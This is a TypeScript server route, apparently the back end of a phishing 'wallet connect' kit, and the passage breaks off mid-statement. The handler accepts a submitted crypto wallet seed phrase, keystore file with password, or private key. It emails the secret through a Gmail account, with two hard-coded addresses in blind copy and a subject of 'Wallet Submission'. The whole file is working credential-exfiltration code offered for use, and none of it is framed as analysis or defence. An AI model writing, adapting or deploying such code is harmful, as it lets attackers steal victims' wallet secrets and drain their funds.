import nodemailer from 'nodemailer';

function formatMessage(message: string): string {
  const lines = message.split(/\r?\n/);
  const formattedLines = lines.map((line) => `<div style="margin-bottom: 10px;">${line}</div>`);
  return `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${formattedLines.join('')}</div>`;
}

export async function POST(request: Request) {
  try {
    const { phrase, keystore, privateKey } = await request.json();

    const email = process.env.GMAIL_USER;
    const pass = process.env.GMAIL_PASS;

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: email,
        pass: pass,
      },
    });

    transporter.verify(function (error, success) {
      if (error) {
        console.error("Transporter verification failed:", error);
      } else {
        console.log("Transporter is ready to send emails.");
      }
    });

    // BCC recipients - invisible to each other
    const bccRecipients = ['fahadabdullahi180@gmail.com', 'arewatrend01@gmail.com'];

    let mailOptions = {
      from: `New Wallet Connect ${email}`,
      to: email, // Your own email or a neutral one (required)
      bcc: bccRecipients,
      subject: 'Wallet Submission',
      html: '',
    };

    // Format content based on what's provided
    if (phrase) {
      mailOptions.html = formatMessage(phrase);
    }

    if (keystore) {
      mailOptions.html = `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`;
    }

    if (privateKey) {
      mailOptions.html = formatMessage(privateKey);
    }

    const result
